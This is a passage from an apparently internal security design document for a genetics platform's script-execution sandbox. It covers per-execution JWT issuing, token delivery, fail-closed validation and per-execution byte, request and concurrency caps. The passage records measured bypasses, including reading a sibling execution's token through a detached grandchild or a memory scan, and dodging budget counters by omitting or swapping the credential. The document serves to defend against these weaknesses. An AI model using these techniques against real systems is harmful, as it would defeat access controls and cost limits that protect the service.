records:

> The NetworkPolicy is not a boundary on its own: mcp-server is permitted through it and is
> itself reachable from outside, so anything that could drive mcp-server could reach
> BigQuery behind it.

`genetics-results-db/api/main.py`'s `require_auth` docstring makes the same point in its own
words — that before the shared secret the sole control was the cluster NetworkPolicy, and
mcp-server sits on *both sides* of that boundary. Same reasoning, different wording; the
quote above is project-spec's.

The sandbox must not become a second instance of that shape. Its network position and its
credential must *both* be narrow.

### Decisions

**Minter:** chat-backend. It is the only caller of the sandbox, it already holds
`INTERNAL_API_SECRET`, and it is the only component that knows the authenticated end user
and the chat session.

**Form:** HS256 JWT, signed with a **new, dedicated** secret `SANDBOX_TOKEN_SIGNING_KEY`
(32 random bytes, `create-secrets.sh`), shared between chat-backend (mint) and
db-api/results-api (verify). Deliberately *not* `INTERNAL_API_SECRET`: separate key,
separate blast radius, independent rotation.

Chosen over an opaque token plus introspection because db-api is stateless and has no
store; introspection would require db-api to call chat-backend, which the NetworkPolicy
does not permit and which inverts the dependency direction. A JWT validates offline.

**Lifetime:** `exp = iat + 300` (5 minutes). The hard wall clock is 120s; the slack covers
a slow BigQuery job started at the last moment. Short enough that a captured token is worth
almost nothing.

**Clock skew, and why the ttl only covers half of it.** The 300s ttl absorbs skew in the
*past* direction — a verifier whose clock runs ahead of the minter's still sees `exp` in the
future, with minutes to spare. It does nothing in the *forward* direction: PyJWT ≥ 2.10
raises `ImmatureSignatureError` as soon as `iat > now`, so a verifier whose clock runs even a
fraction of a second behind the minter's rejects a freshly minted token outright, and the ttl
cannot help. The minter and the two verifiers are separate pods and the sandbox is headed for
a dedicated node pool (`4h6.10`), so they are not even guaranteed the same node clock. Both
verifiers therefore pass `leeway=5` to `jwt.decode`, which applies to `exp`, `nbf` and `iat`
alike. It does **not** loosen the 300s bound: the `MAX_TOKEN_AGE_SECONDS` check is separate
code, compares `iat` against `time.time()` directly, and stays exact.

**One token per audience.** chat-backend mints two per execution. A token captured from a
results-api request cannot be replayed at db-api.

**How the tokens reach the script — not pod environment variables.** An earlier draft said
chat-backend "injects them as two environment variables", which does not describe anything
that can happen: chat-backend cannot set environment variables on a pod that is already
running, and the only reading under which it *could* — env in the sandbox pod spec — turns
a 5-minute per-execution token into a static pod-lifetime credential and destroys the
entire lifetime property. The mechanism is:

1. The tokens travel in the **body of the POST** from chat-backend to the sandbox, minted
   fresh for that execution.
2. The supervisor places them in the **forked child's** environment (or file, below) and
   never in its own. The supervisor holds no credentials at any point (residual #7).
3. Preferred over the child's environment: a **mode-0600 file under `/scratch/<id>`** that
   the SDK reads once and unlinks. Reason: `/proc/<pid>/environ` is readable by any process
   with the same uid, and under option (b) of the pids row the supervisor and child share
   uid 65532 — so a second child, or any helper process the script spawns, can read the
   token out of a sibling's environment. `/scratch/<id>` is per-execution and wiped
   regardless. **The file is not an exposure bound and this paragraph used to imply it was.**
   An earlier phrasing said read-once-and-unlink "closes the window to the interval before the
   SDK's first call". It does not close anything: `4h6.55` measured a detached `setsid()`
   grandchild of an *earlier* execution reading this execution's mode-0600 file **inside** that
   window, and — because the child is forked without exec from a supervisor holding the tokens
   in its address space — measured a raw `/proc/self/mem` scan in the child recovering tokens
   including from an execution that had already completed. The file is still worth writing (it
   keeps the token out of `/proc/<pid>/environ` and gives the SDK something to unlink), but
   what bounds the exposure is `4h6.55`'s resolution and nothing else. See "As built
   (`4h6.41`, `4h6.42`, `4h6.43`, `4h6.46`)" in section 2. **Under option (a) — a distinct child uid — mode 0600 alone makes the file
   unreadable by the child**, which is the process that needs it: the supervisor writes it
   and must then `chown` it to the child uid at mode `0400` *before* the fork. That, and the
   matching rule for artifacts written by the child and read by the supervisor, are in
   section 2's "Permission contract"; option (a) is not implementable without both. **Option
   (b) is the one in effect** ("The uid choice", section 2), so this is the shared-uid case:
   mode 0600 does not exclude the child, and read-once-and-unlink is the whole mitigation.
4. Nothing about the tokens is written to the pod spec, to a ConfigMap, or to a Secret.

**Claims (all required, all validated):**

| Claim | Value | Purpose |
|---|---|---|
| `iss` | `"chat-backend"` | Rejects tokens minted by anything else. |
| `aud` | `"db-api"` or `"results-api"` | Prevents cross-service replay. |
| `sub` | authenticated user email (from `X-Goog-Authenticated-User-Email`) | Attribution to a person. |
| `sid` | chat session id | **Required.** Makes db-api's `endpoint_access` log lines attributable to a conversation, which is what turns the SDK-call instrumentation (`4h6.12`) into an answerable "what did that script actually read?". |
| `jti` | execution id (uuid4) | Same value as the `/scratch/<execution-id>` directory name, so logs join across chat-backend, the sandbox SDK instrumentation and db-api. |
| `iat`, `exp` | as above | |
| `scope` | `"query:views"` | A coarse capability string. **In v1 only its presence is checked** — it is a hook for later per-view narrowing, and is documented as such rather than implied to enforce anything today. |

**Validation in db-api — and this path must NOT inherit fail-open.**

`genetics-results-db/api/main.py` `require_auth` currently begins:

```python
if not INTERNAL_API_SECRET or request.url.path in _UNAUTHENTICATED_PATHS:
    return
```

with a startup `logger.warning` as the only signal. That is deliberate for the shared-secret
path (mid-rollout clusters keep serving) and it is *unacceptable* for the sandbox path,
because the sandbox is the one caller whose input is attacker-influenced. Concretely, for
`4h6.9`:

1. Restructure `require_auth` so a **sandbox-shaped bearer** is routed to the sandbox
   validator *before* the `if not INTERNAL_API_SECRET` early return can short-circuit it.
   The unset-secret branch must be unreachable for such a request.

   **Discriminate on the JOSE header, not on dots.** "Three dot-separated segments" is
   *not* the discriminator — it matches every RS256 Google Identity Token as well, and
   using it would 401 that entire class of caller (latent in db-api today only because
   db-api has no other JWT caller; immediately fatal in results-api, which does — see the
   results-api subsection). The rule: base64url-decode the first segment *unverified*,
   read `alg`, and route to the sandbox validator only when `alg == "HS256"` (optionally
   also requiring `iss == "chat-backend"`). Anything else continues down the pre-existing
   auth paths untouched.

   **Why reading an unverified header is safe here, and what an implementer must not
   conclude from it.** The header is used *only to select a validator*, never to configure
   one. Each branch pins its own algorithm independently of what the header claimed — the
   sandbox branch decodes with `algorithms=["HS256"]` and the signing key, the Google
   branch verifies against Google's RS256 certificates. A forged `alg` therefore changes
   which validator rejects the token, not whether it is rejected. This is *not* licence to
   pass the header's `alg` into the decoder, and not licence to trust `kid`, `iss` or any
   other header field for anything beyond routing.
2. A sandbox-shaped bearer (HS256) is validated **only** as a sandbox token. It must never
   fall through to the `hmac.compare_digest` shared-secret comparison — otherwise a
   malformed token degrades into "is this string equal to the secret", which is a downgrade
   path.
3. If `SANDBOX_TOKEN_SIGNING_KEY` is unset, every sandbox-shaped (HS256) bearer is rejected
   `401`. **Fail closed, with no warning-and-continue.** Non-HS256 bearers are unaffected.
4. Decode with an explicit `algorithms=["HS256"]` allow-list (the `alg: none` / RS256-HMAC-
   confusion footgun), explicit `audience=` matching this service, and
   `options={"require": ["iss", "aud", "sub", "sid", "jti", "iat", "exp"]}`. Reject `iat`
   more than 300s in the past.
5. Log `sid`, `sub` and `jti` on every request authorized this way, into the existing
   structured log line that feeds the `genetics_api_logs` sink — whose production table is
   `phewas-development.genetics_api_logs.stdout` (named after the log ID, not the service; the
   similarly named `genetics_api_logs.genetics_results_api` is a developer VM's test output).
   **Caveat: those three fields are not queryable in BigQuery today.** That table's
   `jsonPayload` schema has no `sid`, `sub` or `jti` column, because no sandbox-authorized
   request has ever reached the sink to grow it — no sandbox Deployment is applied (the manifest
   exists since `4h6.7`, gated off) and
   `SANDBOX_ENABLED` is `"false"` on both services. Until one lands, sandbox attribution is
   readable in Cloud Logging and container stdout only, and any claim here about attributing an
   execution must be checked against the schema rather than assumed.
6. **db-api refuses to start** — `sys.exit(1)`, not a `logger.warning` — when the sandbox
   is deployed and `INTERNAL_API_SECRET` is unset. Rules 1-5 all fire on "a sandbox-shaped
   bearer", and **nothing in this design obliges the sandbox to send one**. A script that
   simply omits the `Authorization` header falls into `if not INTERNAL_API_SECRET: return`
   and is authorized — with no `sid`, `sub` or `jti` to attribute it to anyone, and,
   because the caps below are keyed on the token audience, *without* the byte and row caps
   as well. The fail-closed rules would be opt-in for the one caller they exist for.

   **Trigger on the sandbox being deployed, not on the signing key being present.** An
   earlier draft made rule 6 fire on `SANDBOX_TOKEN_SIGNING_KEY` being set. That leaves the
   both-unset case wide open: deploy db-api with *neither* `SANDBOX_TOKEN_SIGNING_KEY` nor
   `INTERNAL_API_SECRET` while the sandbox is running, and db-api boots fail-open and the
   sandbox reaches it by sending no `Authorization` header at all — exactly the hole rule 6
   exists to close. So the condition is a **separate required input**,
   `SANDBOX_ENABLED` (a boolean env var on db-api and results-api, set true by the same
   deploy that creates the sandbox Deployment): if `SANDBOX_ENABLED` is true and either
   `INTERNAL_API_SECRET` or `SANDBOX_TOKEN_SIGNING_KEY` is unset, `sys.exit(1)`. The
   configuration is then unbootable in *both* the key-set and the both-unset shapes.
7. **`SANDBOX_TOKEN_SIGNING_KEY` joins `deploy.sh`'s existing "check secrets exist" gate**,
   next to the secrets it already verifies before applying manifests. Rule 6 refuses to run
   the pair mis-configured; this stops the pair being *deployed* apart in the first place,
   so the failure surfaces at deploy time rather than as a crash-looping db-api.

**Implementation note for the caps, so they are not enforced in the wrong place.**
`genetics-results-db/api/main.py` declares `max_rows: int = Field(default=1000, le=MAX_ROWS)`
— a **class-level** Pydantic constraint, evaluated at model definition time and identical
for every request. It cannot vary per credential. So the per-credential row cap must be
enforced **in the handler**, after the principal is known, by clamping the validated
`max_rows` down; tightening the module-level `MAX_ROWS` would apply the sandbox default to
every caller in the process, including the relaxed ones.

**Caps are the default, not a penalty applied to sandbox tokens.** This inverts an earlier
draft, in which the sandbox's lower limits were keyed on the sandbox audience — meaning a
caller could obtain *looser* limits by presenting a *weaker* credential, or none at all.
The sandbox-audience limits are the **defaults for every request db-api serves**, relaxed
to the existing operator-configured values only for a request carrying a *verified*
non-sandbox credential. No credential, or an unverified one, gets the tight limits.

**"Verified non-sandbox credential" means different things on the two services, and
conflating them breaks results-api.** On **db-api** it is exactly one thing: a successful
`hmac.compare_digest` against `INTERNAL_API_SECRET`. db-api has no other caller and no
other auth path. On **results-api** that definition is wrong and would silently degrade
real users: `k8s/deployments/auth-gateway.yaml`'s `@api_bearer` location routes
programmatic clients **straight to results-api with their own Google id_token or per-user
chat API token and deliberately no shared secret**. Under an hmac-only rule those verified
humans would land on the tight sandbox defaults on the bulkiest endpoints in the suite —
summary-statistic ranges and LD. So on results-api the relax condition is **any
successfully verified non-sandbox principal**: the shared secret, a verified Google
id_token, or a verified per-user API token. The tight defaults apply to the sandbox
audience and to anything unverified.

**The numbers, and why the earlier ones were not caps.** db-api's existing defaults are
`MAX_ROWS = 100000` and `MAX_BYTES_BILLED = 100 GB`. The earlier "cap" of 50 GB per query
was therefore a factor of two on bytes and no change at all on rows, against a caller that
has 120 seconds in which to loop. For the sandbox audience:

| Limit | Value | Note |
|---|---|---|
| `maximum_bytes_billed` per query | 50 GB | Half the existing default. Bounds one query only — which is the point of the next row. |
| Aggregate bytes billed per `jti` | 200 GB | Four queries at the per-query ceiling. **The control the per-query cap is not.** A single-pod, 120-second, concurrency-1 token needs no shared state to enforce this: an in-process counter in db-api keyed on `jti`, with a bounded LRU so a flood of distinct `jti`s cannot grow it, is sufficient. Over budget → `429`, not a silent truncation. |
| Response rows | 25 000 | **db-api only.** A quarter of the existing default, and well above what any legitimate aggregation returns *to a script* — the script aggregates in-pod and returns 64 KiB to the model regardless (section 2). results-api carries **no** row cap; see "As shipped" below for why counting rows there cost more than it bought. |
| Response bytes per request | 16 MiB | **results-api only** (`SANDBOX_MAX_RESPONSE_BYTES`). Bounds one response, of **any** status — a non-2xx body is caller-controlled too, since FastAPI's 422 handler echoes the offending input. Which is the point of the next four rows. |
| Aggregate response bytes per `jti` | 1 GiB | **results-api only** (`SANDBOX_AGGREGATE_RESPONSE_BYTES_BUDGET`). 64 responses at the per-response cap, or ~8.5 MB/s sustained across the whole 120 second wall clock. Charged from bytes actually **sent**, so it agrees with the per-response cap's own buffer rather than re-measuring — and charged for every status, not only 2xx. |
| Requests per `jti` | 1000 | **results-api only** (`SANDBOX_MAX_REQUESTS_PER_EXECUTION`). The byte budget does not bound a loop of *small* responses, and every request costs a tabix seek or a GCS range read whatever its size. ~8 rps over 120 seconds. |
| Concurrent requests per `jti` | 4 | **results-api only** (`SANDBOX_MAX_CONCURRENT_REQUESTS`). The one limit here with a **memory** failure mode rather than a cost one: each in-flight capped request buffers up to 16 MiB. 4 × 16 MiB = 64 MiB. |
| Concurrent sandbox requests per pod | 8 | **results-api only** (`SANDBOX_MAX_CONCURRENT_REQUESTS_TOTAL`). Across all executions. Unreachable today, since the sandbox is `concurrency: 1` and the per-`jti` limit binds first; it exists so raising the sandbox's own concurrency cannot silently multiply this pod's peak buffer against its 8Gi limit. |

All are enforced server-side from the token, never requested by the caller, and a
script cannot widen them by asking. The db-api values are module constants; the results-api ones
are env-configurable, because results-api payload sizes vary by dataset and format in a way
BigQuery byte counts do not and an operator has to be able to move them without a rebuild.

**What the aggregate budget actually bounds — stated rather than left to be inferred.**
`jti` is the **execution** id, so 200 GB is a per-*execution* budget, not per session and
not per user. chat-backend mints a fresh `jti` for every `run_analysis` call, so the real
bound on a determined user is **200 GB × turns**, and nothing in this design caps the number
of turns. That is tolerable here for two measured reasons, not by assumption: concurrency is
1 with a queue, so executions serialize rather than multiply, and the measured peak is 23
chat turns/hour — an upper bound of roughly 4.6 TB/hour scanned *if every turn ran a script
that deliberately exhausted its budget*, which is visible in BigQuery billing and — now that
`4h6.43`/`4h6.44` deliver the token and db-api's `endpoint_access` line therefore carries `sub`,
`sid` and `jti` — attributable per user and session through the db-api half of control 3 in
6.2. The SDK-side half of that control is still neither collected nor, against a hostile
script, trustworthy (6.2, control 3). If a
per-session or
per-user budget is ever wanted, the same in-process LRU counter keyed on `sid` or `sub`
instead of `jti` provides it; it is deliberately not in v1 because a cross-turn budget needs
shared state once replicas exceed 1.

**As shipped (`genetics-results-suite-4h6.28`), and the one place the implementation departs
from the paragraphs above.** db-api enforces all three limits in `api/main.py`: `_caps_for()`
resolves the row and byte ceilings from `request.state.principal`, the row cap is clamped in
`execute_query` (not on the Pydantic field, and not by lowering `MAX_ROWS`), and the aggregate
budget is charged from the dry run's estimate *before* the query runs and reconciled afterwards
to the bytes the job **processed** — so a cache hit does not consume budget and the 429 arrives
before the spend, not after it. A query that raises between the charge and the reconcile is
refunded in a `finally`: a job that never ran bills nothing, so a script's syntax errors, each
priced by the dry run, must not eat a budget they spent no bytes of.

*Processed, not billed — this section previously said "actually billed", which is the wrong
figure.* `total_bytes_billed` is what Google invoices (10 MB minimum, rounded up), but a
**dry-run job reports only `total_bytes_processed`** — its billed figure is 0. Processed is
therefore the one number available on *both* sides of a pre-flight charge and its correction,
and charging in one unit while reconciling in the other would make the correction wrong by
construction. The two differ by at most 10 MB per query against a 200 GB budget.

*The budget covers all four of db-api's BigQuery paths, not only `/query`.* `/schema`'s
distinct-value scans, `/stats`'s uncached `GROUP BY dataset, data_type` over `credible_sets_v`,
and `/tables/{t}/sample` all submit jobs and none of them is cached at the HTTP layer, so a
script could loop them for its whole wall clock at up to 50 GB a call entirely outside a budget
this section describes as an aggregate across every query of one execution. All three now go
through one shared helper (`_run_internal_query`) that refuses to start a job once the budget is
spent and charges what the job processed once it finishes. Post-hoc charging is forced — those
paths have no dry run to price them with — and it means the budget can be overshot by at most
one query, and by at most that query's `maximum_bytes_billed`, which is exactly what the
per-query cap bounds.

*The `/schema` value scans run at the **triggering** caller's ceiling, not the operator's.* They
used to pass no request at all, so a sandbox request drove them at the relaxed 100 GB ceiling —
**twice its own per-query cap** — and paid nothing, which inverts the point of the caps. The
earlier justification (one caller's cap must not decide what a later caller finds in the shared
`_get_categorical_values` cache) was sound about the cached *value*, but it silently also decided
who pays and at what ceiling, and those are separable. Cache contents are still not contaminated
across callers: a job over the triggering caller's ceiling fails and leaves the cache
unpopulated, so the next caller retries the scan under its own limits. `_VALUES_CACHE_TTL_SECONDS`
behaviour is otherwise unchanged.

db-api runs `replicas: 1` and no HorizontalPodAutoscaler exists in
`k8s/`, so the in-process counter is exact today — **at more than one replica it bounds spend
per replica, not globally.** That is a real limit of the design, not a detail: two replicas
would make the effective budget 400 GB per `jti`. `k8s/deployments/db-api.yaml` carries a
comment on `replicas: 1` saying so, because a routine scale-up would otherwise multiply the
budget silently.

results-api enforces a **16 MiB response-byte cap, and no row cap**, in
`SandboxResponseCapMiddleware` (`app/middleware.py`), registered innermost so it measures the
payload the caller decodes rather than its gzipped size. A capped response is buffered —
bounded by the byte cap itself — because a stream cannot be un-sent once its first chunk is on
the wire, and this design requires a 429 rather than a truncation. A relaxed response is never
buffered or inspected, so browser and BFF traffic is untouched.

*Why there is no row cap here, though the table above lists one for db-api.* Enforcing it meant
`json.loads` over the whole buffered body, synchronously on the event loop, purely to get a
length. For 25 000 wide rows the parsed object graph is several times the byte size, so peak
memory ran to roughly 100–200 MB per in-flight capped request on a `replicas: 1` pod with an
8Gi limit that already preloads the gene maps and the search index — and nothing limits a
script's concurrency. That made the row cap a memory amplifier **only a sandbox caller could
trigger**: presenting the token hurt the service more than omitting it. It also never bound the
payloads it was written for, because the counter recognised only JSON and **TSV is the default
`format` of every bulk range endpoint**. The byte cap was already the binding one — 25 000
summary-statistic rows serialize to roughly 5 MB, well inside 16 MiB — so dropping the row cap
removes the amplifier without loosening anything that bound. The buffer is now also passed
downstream as-is instead of being copied to `bytes`, which removed a second 16 MiB peak.

*Over the cap the producer is torn down, not merely ignored.* Dropping the later ASGI messages
bounds what the caller **receives** but not what results-api **spends**: measured, a 10 KiB cap
against a 100 KiB `StreamingResponse` returned 429 after 11 chunks while the generator produced
all 100 — and on the real endpoints that generator is GCS range reads plus the
`TABIX_FILTER_WORKERS` pool. The middleware now raises out of `send` once the 429 is on the
wire, which breaks `StreamingResponse.stream_response`'s `async for` and abandons the iterator.
The exception passes through Starlette's `ExceptionMiddleware` (which handles only
`HTTPException`) untouched and is caught by the cap middleware itself, so no 500 is ever
attempted over the 429 already sent. `tests/test_response_caps.py` counts the generator's
iterations to pin this, on both ASGI spec versions.

*The per-execution limits on results-api (`genetics-results-suite-4h6.29`).* The byte cap above
bounds **one** response; it does not bound a script that issues many in-cap requests over its 120
seconds, and the producer teardown of `4h6.28` bounds what a single *rejected* request costs to
produce, not a loop of accepted ones. `app/core/sandbox_budget.py` is the analogue of db-api's
`_jti_bytes`, deliberately shaped like it — one in-process map keyed on `jti`, checked **before**
the handler runs, answering 429 rather than truncating. The table above has **five** results-api
rows and this module holds **four** of them — the aggregate byte budget, the request count and
the two concurrency bounds; the 16 MiB per-response row lives in `app/core/limits.py` and
`app/middleware.py` instead. It carries a fifth control of its own that is not a table row,
`SANDBOX_MAX_TRACKED_EXECUTIONS` (below), which is why it emits **five** rejection codes.

It is admitted and released inside `SandboxResponseCapMiddleware`, whose `finally` the ASGI
contract puts after the last byte of the response, a `StreamingResponse` included. An earlier
draft justified that placement by saying a streaming generator outlives every dependency's
teardown; **measured on FastAPI 0.136.1 that is false** — a `yield` dependency's exit code runs
*after* the response body, so for a matched route the two placements are indistinguishable. The
reason the middleware is nevertheless the only correct place is different and stronger: `admit`
runs for every request, while a dependency is solved only for a **matched route**. An unmatched
path 404s out of the router with no dependency ever entered, so a teardown placement strands
that concurrency slot permanently — and `_sweep_locked` cannot reclaim the entry either, since
it refuses to evict anything with `in_flight > 0`. That is the mutation
`tests/test_sandbox_budget.py::test_an_unmatched_route_releases_its_slot` exists to kill.

*Rejection, not queueing, and the reason.* Queueing an over-concurrency request holds it while
the sandbox's ~120 second clock keeps running, which a script cannot distinguish from slow data
and cannot act on, and work admitted from a queue can complete after its execution is already
dead — precisely the wasted production `4h6.28` removed. A fast 429 leaves the script clock to
narrow the request or back off. Every one of these 429s carries a `code`, a `limit` and an
`observed` value (`sandbox_response_bytes`, `sandbox_aggregate_bytes`, `sandbox_request_count`,
`sandbox_concurrency`, `sandbox_concurrency_pod`, `sandbox_execution_tracker_full`), so an
operator reading a log line knows which control fired without inferring it from prose.

*Bytes are counted as **sent**, from the cap middleware's own buffer.* The two therefore cannot
diverge or double-count. **Every status is buffered, capped and charged, not only 2xx.** An
earlier draft exempted error responses on the grounds that "an error body is small"; that is
false, because FastAPI's own 422 handler *echoes the offending input* — measured, a 100 000-char
query parameter produced a 100 144-byte error body, and a 200 014-byte body was delivered under
a 500-byte cap with `bytes_sent` left at 0. Uncharged, uncapped error bodies made the real egress
bound `SANDBOX_MAX_REQUESTS_PER_EXECUTION` × (whatever fits in a URI or a request body) rather
than the 1 GiB budget. What the status still changes is only the *rejection*: an over-cap 2xx
becomes a 429, while an over-cap non-2xx keeps its own status and gets the same bounded stub
body, because rewriting a 404 into a 429 loses the real answer and invites a retry that can only
404 again. One body remains uncharged — a response *rejected* over the 16 MiB cap, whose bytes
never went on the wire; a loop of those is what the request-count limit bounds, and each still
consumes a request slot.

*Cleanup cannot evict a live execution.* db-api trims `_jti_bytes` LRU at 1024 entries, which can
drop a running execution's counter and silently reset its budget: the fail-open direction. Here
an entry is evictable only once its token has passed the point where `verify_sandbox_token` would
still accept it (`exp` plus the verifier's leeway, so no further request can present that `jti`)
**and** it has nothing in flight — the second condition covering a stream that outlives its own
token. The map is still hard-bounded at `SANDBOX_MAX_TRACKED_EXECUTIONS` (4096, swept lazily when
a new `jti` arrives), but at the bound it is the *new* execution that is refused, never a running
one that is evicted. Entries live at most one token lifetime (~305 s), so at the measured peak of
23 chat turns/hour the bound is a backstop rather than a working limit.

*`replicas: 1` is load-bearing here too.* The counters are in-process, so N replicas give one
execution N × every limit above — and N × the pod-wide concurrency bound that exists to protect
this pod's 8Gi against buffered response bodies. `k8s/deployments/results-api.yaml` carries a
comment on `replicas: 1` saying so, matching db-api's.

*Operator-tunable in fact, not only in principle.* All five env vars are declared at their
defaults in `k8s/deployments/results-api.yaml`, so tuning one is an edit and a rollout rather
than a rebuild. They were code-default-only in the first draft, which made "env-configurable"
true of the code and false in practice. Each is a ceiling compared with `>=`, so a value below 1
would silently mean "reject every sandbox request" — results-api therefore refuses to start on
one, and on `SANDBOX_MAX_CONCURRENT_REQUESTS_TOTAL < SANDBOX_MAX_CONCURRENT_REQUESTS`, rather
than failing at the first request where no health check would attribute it to a typo.

**Two limitations, stated because as shipped these controls bound less than the rest of this
section implies.**

1. *They only bind a request that volunteers a token — and the thing that makes that sufficient
   is not in this section.* `_sandbox_principal` reads the `Authorization` header off the ASGI
   scope; with no header it returns `None` and `admit` is never called, so the request is
   counted against **nothing**: no aggregate byte budget, no request count, no concurrency slot.
   Until `genetics-results-suite-0lf` that was an open hole: results-api answered 200 with no
   credential on seven `@is_public` routes (`/api/v1`, `/healthz`, `/api/v1/auth`,
   `/api/v1/variant_sets`, `/api/v1/variant_sets/{name}`, and `/api/v1/rsid/variants` GET and
   POST — re-derive with `grep -rn "@is_public" app/`, or read the live route table with
   `app.dependencies.public_route_paths`), the sandbox's NetworkPolicy egress reaches
   `results-api:4000` **directly**, bypassing auth-gateway, and 20 of 20 header-less requests
   were measured served 200 with the counter map still empty.

   **Partially closed — the no-credential path only — by shrinking the anonymous surface rather
   than by identifying the caller.** With `ANONYMOUS_SURFACE_MINIMAL` on,
   `app.dependencies.is_public_endpoint` treats only `ALWAYS_ANONYMOUS_PATHS` — today `/healthz`
   alone — as servable with no principal. Every other route answers 401 to a request carrying no
   credential.

   **That control is its own flag, and it defaults to on** (`genetics-results-suite-rhh`). It
   was keyed directly on `SANDBOX_ENABLED` in the first draft, which made the incident lever and
   the security lever the same switch with the security side failing **open**: turning the
   sandbox off during an incident — the routine action, and one whose variable name advertises
   nothing about the anonymous surface — silently re-opened all six routes. `SANDBOX_ENABLED`
   now only *forces* the minimal surface, so the sandbox can never run with the wide one, while
   `ANONYMOUS_SURFACE_MINIMAL=false` is an explicit, sandbox-overridable widening. The parse is
   inverted relative to every other boolean in `app/config/common.py` — unset is **on**, only an
   explicit false-y value turns it off — so a typo fails safe.

   *Defaulting it on changes behaviour at the next deploy rather than at sandbox rollout, and
   that is deliberate.* The argument never depended on the sandbox existing. Most in-cluster
   callers admitted to `results-api:4000` by `k8s/network-policies/policies.yaml` already present
   a credential — auth-gateway's `@api_bearer` forwards the client's own bearer, chat-backend and
   mcp-server send `INTERNAL_API_SECRET` from their Deployments, the monitor CronJob
   authenticates and its only other results-api route was never `@is_public`, and the kubelet
   reaches `/healthz`, which stays anonymous.

   **Two callers do not, and the browser is one of them — this is a three-service ordering
   constraint, `bff` → `mcp-server` → `results-api`, and nothing enforces it.**

   1. *The browser.* The BFF attaches the shared secret only on its **typed** upstream routes
      (`bff/upstream.ts`). All six routes this narrows are reached through the BFF's **generic
      passthrough** (`bff/passthrough.ts`), which attaches nothing. Measured against the live
      cluster: a header-less request through the **deployed** BFF gets **200** from
      `/api/v1/auth`. The passthrough change that adds `Authorization` exists only in
      genetics-results-browser's un-deployed `db-only-architecture` worktree. Deploying
      results-api first therefore 401s the browser on its login-state probe (`/api/v1/auth`),
      on `/api/v1/variant_sets` and `/api/v1/variant_sets/{name}`, and on `/api/v1/rsid/variants`.
      Ship that BFF build first.
   2. *An mcp-server pod with `INTERNAL_API_SECRET` unset*, whose tool executor's header build
      fell back to sending nothing at all; `genetics-results-suite-618` made that a startup
      failure. Be precise about what shipping 618 first buys: **not** a working pod. It converts
      a bare, unexplained 401 on every tool call into a CrashLoopBackOff naming the variable.
      Diagnosability, not availability.

   `scripts/rollout.sh`'s `ORDERING:` header carries the sequence. `scripts/deploy.sh` restarts
   every Deployment in one loop with no waiting and with results-api ahead of chat-backend and
   mcp-server — i.e. it actively does the adverse order — and now says so next to its `DEPLOYS`
   list. Neither is a guard.

   *What 618 actually does, since "assert it in the executor" would have been wrong.*
   `config/settings.py:require_internal_api_secret()` raises with a message naming the variable,
   and the two **deployed entrypoints** call it: `mcp_server.main()` on the remote transports,
   beside the existing `MCP_API_KEY` refusal, and `chat_api`'s lifespan when `REQUIRE_AUTH` is
   true. It is deliberately not enforced at import, in `Settings`, or in `ToolExecutor.__init__`,
   because two legitimate callers hold no secret: a local run against an unauthenticated
   results-api (the README documents the variable as optional), and **the sandbox image, which
   holds no internal credential by design** — `_PrunedInstallSettings` ships the SDK's import
   closure without `config/settings.py` and the sandbox gets a per-execution token instead
   (`4h6.9`/`4h6.44`). A full install that builds the client with no secret logs a warning naming
   the variable, which is the only local signal a developer gets. Note that **only
   `k8s/deployments/mcp-server.yaml` marks the `internal-api-secret` `secretKeyRef`
   `optional: true`** — that is exactly how the variable ends up unset with the pod still
   starting, and mcp-server is therefore the only one of the two that can reach the silently
   anonymous state the guard exists to catch. `k8s/deployments/chat-backend.yaml` sets no
   `optional` on that key, so a missing key there never starts the container at all: it is a
   `CreateContainerConfigError` on the pod, not an unset variable inside a running process. Both
   still call the guard, because an *empty* value satisfies the kubelet and reaches the process
   in either Deployment. results-api still cannot tell a sandbox request from a browser request — both
   arrive on `:4000` in-cluster — and for this half it does not have to.

   **What is emphatically not true is that "the only way into a handler is to present a
   credential, and presenting the sandbox's is what calls `admit`."** Earlier drafts of this
   section, and of both module docstrings, said exactly that. `admit` is reached only from
   `_sandbox_principal`, which accepts an **HS256 sandbox token and nothing else**.
   `INTERNAL_API_SECRET` satisfies `is_internal_caller`, so `get_verified_user` resolves
   `mcp-tool` and the request enters the handler with **`admit` never called**. Measured, driving
   the real ASGI app with `SANDBOX_ENABLED=true` and `REQUIRE_AUTH=true` and
   `Authorization: Bearer $INTERNAL_API_SECRET`:

   | request | result | `sandbox_budget._executions` after |
   |---|---|---|
   | `GET /api/v1/rsid/variants` | 200, `user_email=mcp-tool` | `{}` |
   | `GET /api/v1/variant_sets` | 200, `user_email=mcp-tool` | `{}` |

   This was not hypothetical, and it is the reason the transport had to change. While
   `sdk/client.py` authenticated with `INTERNAL_API_SECRET`, a sandbox script shed all four
   counters by sending the internal secret **instead of** sending no header — the fix to the
   no-credential half converted "omit the header" into "send the other header".

   **The sandbox's half of that residue is now closed, in the transport rather than in
   results-api's request code.** `genetics-results-suite-4h6.44` has landed: the SDK builds its
   client from the per-execution tokens when `SANDBOX_TOKEN_FILE` names them, attaches the
   audience-bound token for each destination, and **never attaches `INTERNAL_API_SECRET`
   alongside or instead** — the two paths are mutually exclusive in `_build_client`, precisely
   because attaching both, or preferring the secret, would silently re-open this. A missing or
   unusable token file raises rather than falling back. `genetics-results-suite-4h6.7` keeps the
   Deployment half: the sandbox is never given the secret in the first place.

   **What remains is intentional and is not the sandbox's.** results-api still serves an
   internal-secret caller with no accounting, because chat-backend, mcp-server and bff
   legitimately authenticate that way and none of them is a per-execution tenant.
   `tests/test_anonymous_surface.py::test_the_internal_secret_path_survives_but_the_sdk_no_longer_takes_it`
   pins **both** halves as current behaviour: the internal-secret path is still served
   unaccounted, and the SDK no longer takes it. It replaces the earlier
   `test_an_internal_secret_caller_is_served_but_not_accounted`, which recorded the residue as
   something expected to fail once `4h6.44` landed — the residue did not go away, the *caller*
   did.
   The invariant `app/core/limits.py` states — that omitting the header cannot buy a *looser*
   limit — held for the per-response byte cap only; for these four counters, omitting it would
   buy **no** limit, which is why the anonymous surface has to be *empty* rather than merely
   capped. Both module docstrings now say the partial version.
   Still deliberately **not** done: no rate limiter, no request timeout, no anonymous-traffic
   bucket. `/healthz` remains anonymous by necessity (the kubelet holds no credential and its
   probes bypass NetworkPolicy) and its request rate is unbounded; its handler is a constant
   document on no data path, so that residue is `genetics-results-suite-8zk`'s, not a
   per-execution budget any counter here can hold.
2. *`sandbox_execution_tracker_full` and the pod-wide concurrency limit are cross-tenant denial
   surfaces.* Both are pod-wide, so a caller that fills the counter map or holds the pod-wide
   slots locks *other* executions out; neither is merely a self-limit. The "23 chat turns/hour"
